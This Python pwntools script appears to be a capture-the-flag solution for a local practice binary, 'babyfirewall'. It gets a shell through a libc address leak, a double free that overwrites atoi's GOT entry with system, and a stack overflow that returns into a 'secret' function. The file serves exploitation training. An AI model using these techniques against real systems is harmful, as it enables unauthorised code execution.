#!/usr/bin/python

from pwn import *
from LibcSearcher import *

def welcome(name):
    global s
    s.recvuntil('Your name: ')
    s.send(name)

def add(index, size, content):
    global s
    s.recvuntil('Your choice: ')
    s.send('1')
    s.recvuntil('Index: ')
    s.send(str(index))
    s.recvuntil('Size: ')
    s.send(str(size))
    s.recvuntil('Content: ')
    s.send(content)

def show(index):
    global s
    s.recvuntil('Your choice: ')
    s.send('2')
    s.recvuntil('Index: ')
    s.send(str(index))
    s.recvuntil('Content: ')
    result = s.recvline()
    return result[:len(result)-1] 

def delete(index):
    global s
    s.recvuntil('Your choice: ')
    s.send('3')
    s.recvuntil('Index: ')
    s.send(str(index))

def info():
    global s
    s.recvuntil('Your choice: ')
    s.send('4')
    s.recvuntil('Name: ')
    result = s.recvline()
    return result[:len(result)-1]

def heap_exploit():
    global s
    elf = ELF('./babyfirewall')
    rel_plt     = elf.get_section_by_name('.rel.plt').header.sh_addr
    plt0        = elf.get_section_by_name('.plt').header.sh_addr
    read_plt    = elf.plt['read']
    atoi_got    = elf.got['atoi']

    LIST_addr = 0x804b080 
    welcome('natsu')
    read = show((((read_plt - plt0)/16-1)*8 + rel_plt - LIST_addr)/4) #read function's addr
    read = u32(read[:4])
    libc = LibcSearcher('read', read)
    base = read - libc.dump('read')
    system = base + libc.dump('system')
    log.success("base's address: " + hex(base))
    log.success("system's address: " + hex(system)) 

    add(0, 16, 'abcd')
    delete(0)
    delete(0)
    add(0, 16, p32(atoi_got))
    add(0, 16, 'abcd')
    add(0, 16, p32(system))
    s.recvuntil('Your choice: ')
    s.send('/bin/sh\x00')
    s.interactive()

def stack_exploit():
    global s
    elf = ELF('./babyfirewall')
    secret = elf.symbols['secret']

    welcome('natsu')
    s.recvuntil('Your choice: ')
    payload = 'a'*(0x18+4)
    payload += p32(secret)
    s.send(payload)
    s.interactive()

config = '''
b *0x080489ef
'''
#context.log_level = 'debug'
s = process('./babyfirewall')
#gdb.attach(s, config)

print '1. Heap Exploit'
print '2. Stack Overflow Exploit'
choice = int(raw_input('Your choice: '), 10)
if choice == 1:
    heap_exploit()
elif choice == 2:
    stack_exploit()



